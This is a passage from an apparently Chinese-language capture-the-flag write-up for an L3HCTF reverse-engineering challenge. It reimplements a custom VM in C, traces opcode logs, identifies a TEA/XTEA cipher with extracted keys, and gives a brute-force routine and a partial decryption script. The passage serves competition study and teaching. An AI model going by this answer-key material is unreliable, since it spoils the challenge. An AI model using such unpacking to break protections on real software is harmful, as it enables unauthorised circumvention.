st-&gt;stack - 1, data2, st-&gt;stack - 2, data1); continue; case 13: st-&gt;stack--; continue; case 14: tmp = *(_DWORD*)&amp;pKey[st-&gt;i]; st-&gt;i += 4; pFlag[st-&gt;stack++] = tmp; printf(&quot;pFlag[%d] = %#x\\n&quot;, st-&gt;stack-1, tmp); continue; case 15: tmp = *(_DWORD*)&amp;pKey[st-&gt;i]; index = st-&gt;i + 4 + tmp; st-&gt;i = index; continue; case 16: tmp = st-&gt;i + 4; st-&gt;stack--; if (pFlag[st-&gt;stack]) tmp += *(_DWORD*)&amp;pKey[st-&gt;i]; st-&gt;i = tmp; continue; case 17: tmp = *(_DWORD*)&amp;pKey[st-&gt;i]; st-&gt;stack += tmp; st-&gt;i += 4; continue; case 18: st-&gt;i += 4; return; default: st-&gt;i++; &#125; &#125;&#125;char flag1[4000] = &#123; 0 &#125;; //前40个字节使用户输入的flag，40往后是为了加密flag用到的数据char flag2[4000] = &#123; 0 &#125;; //前40个字节使用户输入的flag，40往后是为了加密flag用到的数据char compare_date[1000] = &#123; 0xE8, 0xFA, 0xE0, 0xAE, 0x01, 0x41, 0x3E, 0xFC, 0x92, 0xAD, 0x7C, 0x16, 0xBE, 0x6C, 0xEA, 0x51, 0x00, 0x01, 0x2A, 0x24, 0x1B, 0x1A, 0x51, 0x01, 0x94, 0x66, 0x4D, 0x51, 0xEB, 0xBF, 0x5F, 0x2F, 0x98, 0x63, 0xD3, 0x46, 0xF0, 0xE3, 0xEE, 0x79, 0&#125;;int main()&#123; struc_1 v12 = &#123; 0 &#125;; struc_1 v13 = &#123; 0 &#125;; memcpy(flag1, &quot;111111111111222211111111111111111111111\\0&quot;, 40); memcpy(flag2, &quot;111111111111222211111111111111111111111\\0&quot;, 40); v12.pFlag = (_DWORD *)flag1; v12.pKey = key1; v12.i = 0; v12.stack = 0; v13.pFlag = (_DWORD*)flag2; v13.pKey = key2; v13.i = 0; v13.stack = 0; for (int i = 0; i &lt; 0XCA; i+=2) &#123; enc_flag(&amp;v12); memcpy(flag2, flag1, 40); enc_flag(&amp;v13); memcpy(flag1, flag2, 40); printf(&quot;----------------------------------------------------------------------------&quot;); &#125; return 0; &#125; 调试发现，flag是分组进行加密的,每8个字符一组，共5组 第一组 L3HCTF&#123;*, 只差1个字符, 暴力破解 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667char compare_date[] = &#123; 0xE8, 0xFA, 0xE0, 0xAE, 0x01, 0x41, 0x3E, 0xFC, 0x92, 0xAD, 0x7C, 0x16, 0xBE, 0x6C, 0xEA, 0x51, 0x00, 0x01, 0x2A, 0x24, 0x1B, 0x1A, 0x51, 0x01, 0x94, 0x66, 0x4D, 0x51, 0xEB, 0xBF, 0x5F, 0x2F, 0x98, 0x63, 0xD3, 0x46, 0xF0, 0xE3, 0xEE, 0x79&#125;;int main()&#123; struc_1 v12 = &#123; 0 &#125;; struc_1 v13 = &#123; 0 &#125;; memcpy(flag1, &quot;111111111111111111111111111111111111111\\0&quot;, 40); memcpy(flag2, &quot;111111111111111111111111111111111111111\\0&quot;, 40); v12.pFlag = (_DWORD*)flag1; v12.pKey = key1; v12.i = 0; v12.kk = 0; v13.pFlag = (_DWORD*)flag2; v13.pKey = key2; v13.i = 0; v13.kk = 0; memcpy(flag1, &quot;L3HCTF&#123;1&quot;, 8); memcpy(flag2, &quot;L3HCTF&#123;1&quot;, 8); for (int j = 32; j &lt; 127; j++) &#123; v12.pFlag = (_DWORD*)flag1; v12.pKey = key1; v12.i = 0; v12.kk = 0; v13.pFlag = (_DWORD*)flag2; v13.pKey = key2; v13.i = 0; v13.kk = 0; memcpy(flag1, &quot;L3HCTF&#123;&quot;, 8); memcpy(flag2, &quot;L3HCTF&#123;&quot;, 8); flag1[7] = j; flag2[7] = j; for (int i = 0; i &lt; 0XCA; i += 2) &#123; enc_flag(&amp;v12); memcpy(flag2, flag1, 40); enc_flag(&amp;v13); memcpy(flag1, flag2, 40); &#125; if (memcmp(flag1, compare_date, 8) == 0) &#123; printf(&quot;%c\\n&quot;, j); getchar(); &#125; &#125; return 0;&#125;//D 发现第一组是L3HCTF&#123;D 然后下面开始还原VM，只需还原出加密每一组的第一个循环就OK 输入flag 为 L3HCTF&#123;D1111222211111111111111111111111 1234第二组为Input: 31 31 31 31 32 32 32 32enc后Output: ec 9d 57 67 94 6a 7e a5 通过打印的日志，追踪Input，来分析如何得到的Output 加密flag的第二组的第一个循环的日志 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564输入：31 31 31 31 32 32 32 32输出：ec 9d 57 67 94 6a 7e a5======以下是打印的日志OPCODE :14pFlag[21] = 0x14------&gt;OPCODE :14pFlag[22] = 0x14------&gt;OPCODE :9pFlag[22] = 0x13;------&gt;OPCODE :14pFlag[23] = 0x1------&gt;OPCODE :0pFlag[22] = pFlag[23]:0x1 + pFlag[22]:0x13;------&gt;OPCODE :8pFlag[20] = 0x14;------&gt;OPCODE :15------&gt;OPCODE :14pFlag[21] = 0x14------&gt;OPCODE :9pFlag[21] = 0x14;------&gt;OPCODE :14pFlag[22] = 0x14------&gt;OPCODE :12exchange pFlag[22]:0x14, pFlag[21]:0x14------&gt;OPCODE :1pFlag[21] = pFlag[22]:0x14 - pFlag[21]:0x14;------&gt;OPCODE :11pFlag[21] = 0;------&gt;OPCODE :10pFlag[21] = 1;------&gt;OPCODE :16------&gt;OPCODE :14pFlag[21] = 0x13------&gt;OPCODE :14pFlag[22] = 0x13------&gt;OPCODE :9pFlag[22] = 0;------&gt;OPCODE :14pFlag[23] = 0x2------&gt;OPCODE :0pFlag[22] = pFlag[23]:0x2 + pFlag[22]:0;------&gt;OPCODE :8pFlag[19] = 0x2;------&gt;OPCODE :15------&gt;OPCODE :14pFlag[21] = 0x13------&gt;OPCODE :9pFlag[21] = 0x2;------&gt;OPCODE :14pFlag[22] = 0xa------&gt;OPCODE :12exchange pFlag[22]:0x2, pFlag[21]:0xa------&gt;OPCODE :1pFlag[21] = pFlag[22]:0x2 - pFlag[21]:0xa;------&gt;OPCODE :11pFlag[21] = 1;------&gt;OPCODE :10pFlag[21] = 0;------&gt;OPCODE :16------&gt;OPCODE :14pFlag[21] = 0x14------&gt;OPCODE :14pFlag[22] = 0------&gt;OPCODE :8pFlag[20] = 0;------&gt;OPCODE :14pFlag[21] = 0x14------&gt;OPCODE :9pFlag[21] = 0;------&gt;OPCODE :14pFlag[22] = 0x14------&gt;OPCODE :12exchange pFlag[22]:0, pFlag[21]:0x14------&gt;OPCODE :1pFlag[21] = pFlag[22]:0 - pFlag[21]:0x14;------&gt;OPCODE :11pFlag[21] = 1;------&gt;OPCODE :10pFlag[21] = 0;------&gt;OPCODE :16------&gt;OPCODE :14pFlag[21] = 0xc------&gt;OPCODE :14pFlag[22] = 0x13------&gt;OPCODE :9pFlag[22] = 0x2;------&gt;OPCODE :14pFlag[23] = 0------&gt;OPCODE :0pFlag[22] = pFlag[23]:0 + pFlag[22]:0x2;------&gt;OPCODE :9pFlag[22] = 0x31313131;------&gt;OPCODE :8pFlag[12] = 0x31313131;------&gt;OPCODE :14pFlag[21] = 0xd------&gt;OPCODE :14pFlag[22] = 0x13------&gt;OPCODE :9pFlag[22] = 0x2;------&gt;OPCODE :14pFlag[23] = 0x1------&gt;OPCODE :0pFlag[22] = pFlag[23]:0x1 + pFlag[22]:0x2;------&gt;OPCODE :14pFlag[23] = 0------&gt;OPCODE :0pFlag[22] = pFlag[23]:0 + pFlag[22]:0x3;------&gt;OPCODE :9pFlag[22] = 0x32323232;------&gt;OPCODE :8pFlag[13] = 0x32323232;------&gt;OPCODE :14pFlag[21] = 0xc------&gt;OPCODE :14pFlag[22] = 0xc------&gt;OPCODE :9pFlag[22] = 0x31313131;------&gt;OPCODE :14pFlag[23] = 0xd------&gt;OPCODE :9pFlag[23] = 0x32323232;------&gt;OPCODE :14pFlag[24] = 0x10------&gt;OPCODE :2pFlag[23] = pFlag[24]:0x10 * pFlag[23]:0x32323232; ====------&gt;OPCODE :14pFlag[24] = 0xd------&gt;OPCODE :9pFlag[24] = 0x32323232;------&gt;OPCODE :14pFlag[25] = 0x20------&gt;OPCODE :12exchange pFlag[25]:0x32323232, pFlag[24]:0x20------&gt;OPCODE :3pFlag[24] = pFlag[25]:0x32323232 / pFlag[24]:0x20; ====------&gt;OPCODE :7pFlag[23] = pFlag[24]:0x1919191 ^ pFlag[23]:0x23232320;------&gt;OPCODE :14pFlag[24] = 0xd------&gt;OPCODE :9pFlag[24] = 0x32323232; ====------&gt;OPCODE :0pFlag[23] = pFlag[24]:0x32323232 + pFlag[23]:0x22b2b2b1; ====------&gt;OPCODE :14pFlag[24] = 0xb------&gt;OPCODE :9pFlag[24] = 0xce0a6e55;------&gt;OPCODE :14pFlag[25] = 0xb------&gt;OPCODE :9pFlag[25] = 0xce0a6e55;------&gt;OPCODE :14pFlag[26] = 0x3------&gt;OPCODE :5pFlag[25] = pFlag[26]:0x3 &amp; pFlag[25]:0xce0a6e55;------&gt;OPCODE :14pFlag[26] = 0xe------&gt;OPCODE :0pFlag[25] = pFlag[26]:0xe + pFlag[25]:0x1;------&gt;OPCODE :9pFlag[25] = 0x6f76;------&gt;OPCODE :0pFlag[24] = pFlag[25]:0x6f76 + pFlag[24]:0xce0a6e55;------&gt;OPCODE :7pFlag[23] = pFlag[24]:0xce0addcb ^ pFlag[23]:0x54e4e4e3;------&gt;OPCODE :0pFlag[22] = pFlag[23]:0x9aee3928 + pFlag[22]:0x31313131; ===------&gt;OPCODE :8pFlag[12] = 0xcc1f6a59;------&gt;OPCODE :14pFlag[21] = 0xb------&gt;OPCODE :14pFlag[22] = 0xb------&gt;OPCODE :9pFlag[22] = 0xce0a6e55; === 上一轮循环剩下的------&gt;OPCODE :14pFlag[23] = 0xa------&gt;OPCODE :9pFlag[23] = 0x75bcd15;------&gt;OPCODE :0pFlag[22] = pFlag[23]:0x75bcd15 + pFlag[22]:0xce0a6e55;------&gt;OPCODE :8pFlag[11] = 0xd5663b6a;====------&gt;OPCODE :14pFlag[21] = 0xd------&gt;OPCODE :14pFlag[22] = 0xd------&gt;OPCODE :9pFlag[22] = 0x32323232;------&gt;OPCODE :14pFlag[23] = 0xc------&gt;OPCODE :9pFlag[23] = 0xcc1f6a59;------&gt;OPCODE :14pFlag[24] = 0x10------&gt;OPCODE :2pFlag[23] = pFlag[24]:0x10 * pFlag[23]:0xcc1f6a59; ===------&gt;OPCODE :14pFlag[24] = 0xc------&gt;OPCODE :9pFlag[24] = 0xcc1f6a59;------&gt;OPCODE :14pFlag[25] = 0x20------&gt;OPCODE :12exchange pFlag[25]:0xcc1f6a59, pFlag[24]:0x20------&gt;OPCODE :3pFlag[24] = pFlag[25]:0xcc1f6a59 / pFlag[24]:0x20;------&gt;OPCODE :7pFlag[23] = pFlag[24]:0xfe60fb53 ^ pFlag[23]:0xc1f6a590;------&gt;OPCODE :14pFlag[24] = 0xc------&gt;OPCODE :9pFlag[24] = 0xcc1f6a59;------&gt;OPCODE :0pFlag[23] = pFlag[24]:0xcc1f6a59 + pFlag[23]:0x3f965ec3;------&gt;OPCODE :14pFlag[24] = 0xb------&gt;OPCODE :9pFlag[24] = 0xd5663b6a;------&gt;OPCODE :14pFlag[25] = 0xb------&gt;OPCODE :9pFlag[25] = 0xd5663b6a;------&gt;OPCODE :14pFlag[26] = 0x800------&gt;OPCODE :12exchange pFlag[26]:0xd5663b6a, pFlag[25]:0x800------&gt;OPCODE :3pFlag[25] = pFlag[26]:0xd5663b6a / pFlag[25]:0x800;------&gt;OPCODE :14pFlag[26] = 0x3------&gt;OPCODE :5pFlag[25] = pFlag[26]:0x3 &amp; pFlag[25]:0xfffaacc8; ====------&gt;OPCODE :14pFlag[26] = 0xe------&gt;OPCODE :0pFlag[25] = pFlag[26]:0xe + pFlag[25]:0;------&gt;OPCODE :9pFlag[25] = 0x494c;------&gt;OPCODE :0pFlag[24] = pFlag[25]:0x494c + pFlag[24]:0xd5663b6a;===------&gt;OPCODE :7pFlag[23] = pFlag[24]:0xd56684b6 ^ pFlag[23]:0xbb5c91c; ===------&gt;OPCODE :0pFlag[22] = pFlag[23]:0xded34daa + pFlag[22]:0x32323232;------&gt;OPCODE :8pFlag[13] = 0x11057fdc; === ------&gt;OPCODE :14pFlag[21] = 0x13------&gt;OPCODE :9pFlag[21] = 0x2;------&gt;OPCODE :14pFlag[22] = 0------&gt;OPCODE :0pFlag[21] = pFlag[22]:0 + pFlag[21]:0x2;------&gt;OPCODE :14pFlag[22] = 0xc------&gt;OPCODE :9pFlag[22] = 0xcc1f6a59;------&gt;OPCODE :8pFlag[2] = 0xcc1f6a59;------&gt;OPCODE :14pFlag[21] = 0x13------&gt;OPCODE :9pFlag[21] = 0x2;------&gt;OPCODE :14pFlag[22] = 0x1------&gt;OPCODE :0pFlag[21] = pFlag[22]:0x1 + pFlag[21]:0x2;------&gt;OPCODE :14pFlag[22] = 0------&gt;OPCODE :0pFlag[21] = pFlag[22]:0 + pFlag[21]:0x3;------&gt;OPCODE :14pFlag[22] = 0xd------&gt;OPCODE :9pFlag[22] = 0x11057fdc;------&gt;OPCODE :8pFlag[3] = 0x11057fdc;------&gt;OPCODE :18 =============================================v13准备开始------&gt;OPCODE :14pFlag[21] = 0x14------&gt;OPCODE :14pFlag[22] = 0x14------&gt;OPCODE :9pFlag[22] = 0x13;------&gt;OPCODE :14pFlag[23] = 0x1------&gt;OPCODE :0pFlag[22] = pFlag[23]:0x1 + pFlag[22]:0x13;------&gt;OPCODE :8pFlag[20] = 0x14;------&gt;OPCODE :15------&gt;OPCODE :14pFlag[21] = 0x14------&gt;OPCODE :9pFlag[21] = 0x14;------&gt;OPCODE :14pFlag[22] = 0x14------&gt;OPCODE :12exchange pFlag[22]:0x14, pFlag[21]:0x14------&gt;OPCODE :1pFlag[21] = pFlag[22]:0x14 - pFlag[21]:0x14;------&gt;OPCODE :11pFlag[21] = 0;------&gt;OPCODE :10pFlag[21] = 1;------&gt;OPCODE :16------&gt;OPCODE :14pFlag[21] = 0x13------&gt;OPCODE :14pFlag[22] = 0x13------&gt;OPCODE :9pFlag[22] = 0;------&gt;OPCODE :14pFlag[23] = 0x2------&gt;OPCODE :0pFlag[22] = pFlag[23]:0x2 + pFlag[22]:0;------&gt;OPCODE :8pFlag[19] = 0x2;------&gt;OPCODE :15------&gt;OPCODE :14pFlag[21] = 0x13------&gt;OPCODE :9pFlag[21] = 0x2;------&gt;OPCODE :14pFlag[22] = 0xa------&gt;OPCODE :12exchange pFlag[22]:0x2, pFlag[21]:0xa------&gt;OPCODE :1pFlag[21] = pFlag[22]:0x2 - pFlag[21]:0xa;------&gt;OPCODE :11pFlag[21] = 1;------&gt;OPCODE :10pFlag[21] = 0;------&gt;OPCODE :16------&gt;OPCODE :14pFlag[21] = 0x14------&gt;OPCODE :14pFlag[22] = 0------&gt;OPCODE :8pFlag[20] = 0;------&gt;OPCODE :14pFlag[21] = 0x14------&gt;OPCODE :9pFlag[21] = 0;------&gt;OPCODE :14pFlag[22] = 0x14------&gt;OPCODE :12exchange pFlag[22]:0, pFlag[21]:0x14------&gt;OPCODE :1pFlag[21] = pFlag[22]:0 - pFlag[21]:0x14;------&gt;OPCODE :11pFlag[21] = 1;------&gt;OPCODE :10pFlag[21] = 0;------&gt;OPCODE :16------&gt;OPCODE :14pFlag[21] = 0xc------&gt;OPCODE :14pFlag[22] = 0x13------&gt;OPCODE :9pFlag[22] = 0x2;------&gt;OPCODE :14pFlag[23] = 0------&gt;OPCODE :0pFlag[22] = pFlag[23]:0 + pFlag[22]:0x2;------&gt;OPCODE :9pFlag[22] = 0xcc1f6a59;------&gt;OPCODE :8pFlag[12] = 0xcc1f6a59;------&gt;OPCODE :14pFlag[21] = 0xd------&gt;OPCODE :14pFlag[22] = 0x13------&gt;OPCODE :9pFlag[22] = 0x2;------&gt;OPCODE :14pFlag[23] = 0x1------&gt;OPCODE :0pFlag[22] = pFlag[23]:0x1 + pFlag[22]:0x2;------&gt;OPCODE :14pFlag[23] = 0------&gt;OPCODE :0pFlag[22] = pFlag[23]:0 + pFlag[22]:0x3;------&gt;OPCODE :9pFlag[22] = 0x11057fdc;------&gt;OPCODE :8pFlag[13] = 0x11057fdc;------&gt;OPCODE :14pFlag[21] = 0xb------&gt;OPCODE :14pFlag[22] = 0xb------&gt;OPCODE :9pFlag[22] = 0x798dcdf9;------&gt;OPCODE :14pFlag[23] = 0xa------&gt;OPCODE :9pFlag[23] = 0x154cbf7; = =====系统中的立即数------&gt;OPCODE :0pFlag[22] = pFlag[23]:0x154cbf7 + pFlag[22]:0x798dcdf9; == 这2个数是固定的------&gt;OPCODE :8pFlag[11] = 0x7ae299f0; =========------&gt;OPCODE :14pFlag[21] = 0xc------&gt;OPCODE :14pFlag[22] = 0xc------&gt;OPCODE :9pFlag[22] = 0xcc1f6a59;------&gt;OPCODE :14pFlag[23] = 0xd------&gt;OPCODE :9pFlag[23] = 0x11057fdc;------&gt;OPCODE :14pFlag[24] = 0x10------&gt;OPCODE :2pFlag[23] = pFlag[24]:0x10 * pFlag[23]:0x11057fdc;========------&gt;OPCODE :14pFlag[24] = 0------&gt;OPCODE :14pFlag[25] = 0xe------&gt;OPCODE :0pFlag[24] = pFlag[25]:0xe + pFlag[24]:0;------&gt;OPCODE :9pFlag[24] = 0x5354;------&gt;OPCODE :0pFlag[23] = pFlag[24]:0x5354 + pFlag[23]:0x1057fdc0; =======------&gt;OPCODE :14pFlag[24] = 0xd------&gt;OPCODE :9pFlag[24] = 0x11057fdc;------&gt;OPCODE :14pFlag[25] = 0xb------&gt;OPCODE :9pFlag[25] = 0x7ae299f0;------&gt;OPCODE :0pFlag[24] = pFlag[25]:0x7ae299f0 + pFlag[24]:0x11057fdc;------&gt;OPCODE :14pFlag[25] = 0xd------&gt;OPCODE :9pFlag[25] = 0x11057fdc;------&gt;OPCODE :14pFlag[26] = 0x20------&gt;OPCODE :12exchange pFlag[26]:0x11057fdc, pFlag[25]:0x20------&gt;OPCODE :3pFlag[25] = pFlag[26]:0x11057fdc / pFlag[25]:0x20; ### 0x882bfe------&gt;OPCODE :14pFlag[26] = 0x1------&gt;OPCODE :14pFlag[27] = 0xe------&gt;OPCODE :0pFlag[26] = pFlag[27]:0xe + pFlag[26]:0x1;------&gt;OPCODE :9pFlag[26] = 0x4f4d;------&gt;OPCODE :0pFlag[25] = pFlag[26]:0x4f4d + pFlag[25]:0x882bfe;------&gt;OPCODE :7pFlag[24] = pFlag[25]:0x887b4b ^ pFlag[24]:0x8be819cc; =====------&gt;OPCODE :7pFlag[23] = pFlag[24]:0x8b606287 ^ pFlag[23]:0x10585114;==------&gt;OPCODE :0pFlag[22] = pFlag[23]:0x9b383393 + pFlag[22]:0xcc1f6a59;=====------&gt;OPCODE :8pFlag[12] = 0x67579dec; ######------&gt;OPCODE :14pFlag[21] = 0xd------&gt;OPCODE :14pFlag[22] = 0xd------&gt;OPCODE :9pFlag[22] = 0x11057fdc;------&gt;OPCODE :14pFlag[23] = 0xc------&gt;OPCODE :9pFlag[23] = 0x67579dec;------&gt;OPCODE :14pFlag[24] = 0x10------&gt;OPCODE :2pFlag[23] = pFlag[24]:0x10 * pFlag[23]:0x67579dec;------&gt;OPCODE :14pFlag[24] = 0x2------&gt;OPCODE :14pFlag[25] = 0xe------&gt;OPCODE :0pFlag[24] = pFlag[25]:0xe + pFlag[24]:0x2;------&gt;OPCODE :9pFlag[24] = 0x2074;------&gt;OPCODE :0pFlag[23] = pFlag[24]:0x2074 + pFlag[23]:0x7579dec0; === 49------&gt;OPCODE :14pFlag[24] = 0xc------&gt;OPCODE :9pFlag[24] = 0x67579dec;------&gt;OPCODE :14pFlag[25] = 0xb------&gt;OPCODE :9pFlag[25] = 0x7ae299f0;------&gt;OPCODE :0pFlag[24] = pFlag[25]:0x7ae299f0 + pFlag[24]:0x67579dec; =====------&gt;OPCODE :14pFlag[25] = 0xc------&gt;OPCODE :9pFlag[25] = 0x67579dec;------&gt;OPCODE :14pFlag[26] = 0x20------&gt;OPCODE :12exchange pFlag[26]:0x67579dec, pFlag[25]:0x20------&gt;OPCODE :3pFlag[25] = pFlag[26]:0x67579dec / pFlag[25]:0x20;===&#x27;0x33abcef&#x27;------&gt;OPCODE :14pFlag[26] = 0x3------&gt;OPCODE :14pFlag[27] = 0xe------&gt;OPCODE :0pFlag[26] = pFlag[27]:0xe + pFlag[26]:0x3;------&gt;OPCODE :9pFlag[26] = 0x6561;------&gt;OPCODE :0pFlag[25] = pFlag[26]:0x6561 + pFlag[25]:0x33abcef;------&gt;OPCODE :7pFlag[24] = pFlag[25]:0x33b2250 ^ pFlag[24]:0xe23a37dc;------&gt;OPCODE :7pFlag[23] = pFlag[24]:0xe101158c ^ pFlag[23]:0x7579ff34;------&gt;OPCODE :0pFlag[22] = pFlag[23]:0x9478eab8 + pFlag[22]:0x11057fdc; # &#x27;0xa57e6a94&#x27;------&gt;OPCODE :8pFlag[13] = 0xa57e6a94;------&gt;OPCODE :14pFlag[21] = 0x13------&gt;OPCODE :9pFlag[21] = 0x2;------&gt;OPCODE :14pFlag[22] = 0------&gt;OPCODE :0pFlag[21] = pFlag[22]:0 + pFlag[21]:0x2;------&gt;OPCODE :14pFlag[22] = 0xc------&gt;OPCODE :9pFlag[22] = 0x67579dec;------&gt;OPCODE :8pFlag[2] = 0x67579dec;------&gt;OPCODE :14pFlag[21] = 0x13------&gt;OPCODE :9pFlag[21] = 0x2;------&gt;OPCODE :14pFlag[22] = 0x1------&gt;OPCODE :0pFlag[21] = pFlag[22]:0x1 + pFlag[21]:0x2;------&gt;OPCODE :14pFlag[22] = 0------&gt;OPCODE :0pFlag[21] = pFlag[22]:0 + pFlag[21]:0x3;------&gt;OPCODE :14pFlag[22] = 0xd------&gt;OPCODE :9pFlag[22] = 0xa57e6a94;------&gt;OPCODE :8pFlag[3] = 0xa57e6a94;------&gt;OPCODE :18---------------------------------------------------------------------------- 分析算法 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758A = FLAG[0:4]B = FLAG[4:8]pFlag[23] = B * 0x10pFlag[24] = B / 0X20 pFlag[23] = pFlag[23] ^ pFlag[24]pFlag[23] = B + pFlag[23] pFlag[23] = (0xCE0A6E55 + 0X6F76) ^ pFlag[23] pFlag[22] = pFlag[23] + A TMP1 = pFlag[22] # 173行 0xcc1f6a59 ***V12导出 # v0pFlag[22] = 0xCE0A6E55 # (过会回来补坑，这个是上一轮循环剩下的) 这个与FLAG无关，是固定的pFlag[22] = 0x75bcd15(立即数) + 0xce0a6e55TMP2 = pFlag[22] # 187行 0xd5663b6a #TMP2 = sum1pFlag[23] = TMP1pFlag[23] = TMP1 * 0X10 # 201pFlag[24] = TMP1 / 0x20 # 213pFlag[23] = pFlag[23] ^ pFlag[24]pFlag[23] = TMP1 + pFlag[23] pFlag[26] = TMP2pFlag[25] = pFlag[26] / 0x800 #233行pFlag[24] = TMP2 + 0x494c ###245pFlag[23] = pFlag[24] ^ pFlag[23]pFlag[22] = pFlag[23] + B TMP3 = pFlag[22] ### 251行 0x11057fdc ***V12导出 #v1pFlag[22] = 0x154cbf7(立即数) + 0x798dcdf9; #这2个数是固定的 #在第一轮的时候是这个，其他的还没测试TMP4 = pFlag[22] ###407行 0x7ae299f0pFlag[23] = TMP3 * 0X10pFlag[23] = pFlag[23] + 0X5354 # 421 pFlag[24] = TMP4 + TMP3 #441 pFlag[25] = TMP3 / 0x20 #451 ### 0x882bfepFlag[25] = 0x4f4d + pFlag[25] pFlag[24] = pFlag[25] ^ pFlag[24]pFlag[23] = pFlag[24] ^ pFlag[23] #465 ## 0x9b383393pFlag[22] = pFlag[23] + TMP1TMP5 = pFlag[22] #### 469 0x67579decpFlag[23] = TMP5 * 0X10pFlag[23] = pFlag[23] + 0x2074 ## 0x7579ff34pFlag[24] = TMP4 + TMP5 ####503行pFlag[25] = TMP5 / 0x20pFlag[25] = pFlag[25] + 0x6561pFlag[24] = pFlag[25] ^ pFlag[24]pFlag[23] = pFlag[24] ^ pFlag[23]pFlag[22] = pFlag[23] + TMP3 # 529行 0xa57e6a94TMP6 = pFlag[22] # 0xa57e6a94 通过 * 0x10 、/0x20、 /0x800、 &amp;3等特征，猜测是xtea， tea算法 一边猜一边还原算法,用C语言写出1轮的循环加密算法 1234567891011121314151617181920int tea_key[4] = &#123; 0X5354, 0x4f4d, 0x2074, 0x6561 &#125;;int xtea_key[4] = &#123; 0x494c, 0X6F76 , 0x6520, 0x4355 &#125;;void encrypt(int* v, int&amp; sum_xtea, int&amp; sum_tea)&#123; int v0 = v[0], v1 = v[1]; v0 += (((v1 &lt;&lt; 4) ^ (v1 / 0x20)) + v1) ^ (sum_xtea + xtea_key[sum_xtea &amp; 3]); sum_xtea += 0x75bcd15; v1 += (((v0 &lt;&lt; 4) ^ (v0 / 0x20)) + v0) ^ (sum_xtea + xtea_key[(sum_xtea / 0x800) &amp; 3]); sum_tea += 0x154cbf7; v0 += ((v1 &lt;&lt; 4) + tea_key[0]) ^ (v1 + sum_tea) ^ ((v1 / 0x20) + tea_key[1]); v1 += ((v0 &lt;&lt; 4) + tea_key[2]) ^ (v0 + sum_tea) ^ ((v0 / 0x20) + tea_key[3]); v[0] = v0; v[1] = v1;&#125; sum_tea 和 sum_xtea，对于每一组来说，初始值是不同的，比如第二组这里是0x798dcdf9 和 0xce0a6e55 最后通过打印三，四，五组第一个循环的日志，来与第二组的日志做对比，找到了所有组的初始的sum_tea 和 sum_xtea 123456int sum[4][2] = &#123; 0xCE0A6E55, 0x798dcdf9, 0x613673f9, 0x942dbd45, 0xf462799d, 0xaecdac91, 0x878e7f41, 0xc96d9bdd&#125;; 最终写脚本解密 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int sum[4][2] = &#123; 0xCE0A6E55, 0x798dcdf9, 0x613673f9, 0x942dbd45, 0xf462799d, 0xaecdac91, 0x878e7f41, 0xc96d9bdd&#125;;int tea_key[4] = &#123; 0X5354, 0x4f4d, 0x2074, 0x6561 &#125;;int xtea_key[4] = &#123; 0x494c, 0X6F76 , 0x6520, 0x4355 &#125;;void encrypt(int* v, int&amp; sum_xtea, int&amp; sum_tea)&#123; int v0 = v[0], v1 = v[1]; v0 += (((v1 &lt;&lt; 4) ^ (v1 / 0x20)) + v1) ^ (sum_xtea + xtea_key[sum_xtea &amp; 3]); sum_xtea += 0x75bcd15; v1 += (((v0 &lt;&lt; 4) ^ (v0 / 0x20)) + v0) ^ (sum_xtea + xtea_key[(sum_xtea / 0x800) &amp; 3]); sum_tea += 0x154cbf7; v0 += ((v1 &lt;&lt; 4) + tea_key[0]) ^ (v1 + sum_tea) ^ ((v1 / 0x20) + tea_key[1]); v1 += ((v0 &lt;&lt; 4) + tea_key[2]) ^ (v0 + sum_tea) ^ ((v0 / 0x20) + tea_key[3]); v[0] = v0; v[1] = v1;&#125;void decrypt(int* v, int&amp; sum_xtea, int&amp; sum_tea)&#123; int v0 = v[0], v1 = v[1]; v1 -= ((v0 &lt;&lt; 4) + tea_key[2]) ^ (v0 + sum_tea) ^ ((v0 / 0x20) + tea_key[3]); v0 -= ((v1 &lt;&lt; 4) + tea_key[0]) ^ (v1 + sum_tea) ^ ((v1 / 0x20) + tea_key[1]); sum_tea -= 0x154cbf7;; v1 -= (((v0 &lt;&lt; 4) ^ (v0 / 0x20)) + v0) ^ (sum_xtea + xtea_key[(sum_xtea / 0x800) &amp; 3]); sum_xtea -= 0x75bcd15; v0 -= (((v1 &lt;&lt; 4) ^ (v1 / 0x20)) + v1) ^ (sum_xtea + xtea_key[sum_xtea &amp; 3]); v[0] = v0; v[1] = v1;&#125;char compare_date[100] = //这里是从程序中提取的加密后的flag的值&#123; 0xE8, 0xFA, 0xE0, 0xAE, 0x01, 0x41, 0x3E, 0xFC, 0x92, 0xAD, 0x7C, 0x16, 0xBE, 0x6C, 0xEA, 0x51, 0x00, 0x01, 0x2A, 0x24, 0x1B, 0x1A, 0x51, 0x01, 0x94, 0x66, 0x4D, 0x51, 0xEB, 0xBF, 0x5F, 0x2F, 0x98, 0x63, 0xD3, 0x46, 0xF0, 0xE3, 0xEE, 0x79&#125;;int main()&#123; int v[2] = &#123; 0 &#125;; int* encFlag = (int*)compare_date; //flag的前8个字符爆破得到的 L3HCTF&#123;D for (int j = 0; j &lt; 4; j++) //后32个字符，分4组 &#123; for (int i = 0; i &lt; 20; i++) encrypt(v, sum[j][0], sum[j][1]); //提升sum_xtea 和 sum_tea for (int i = 0; i &lt; 20; i++) decrypt(&amp;encFlag[j * 2 + 2], sum[j][0], 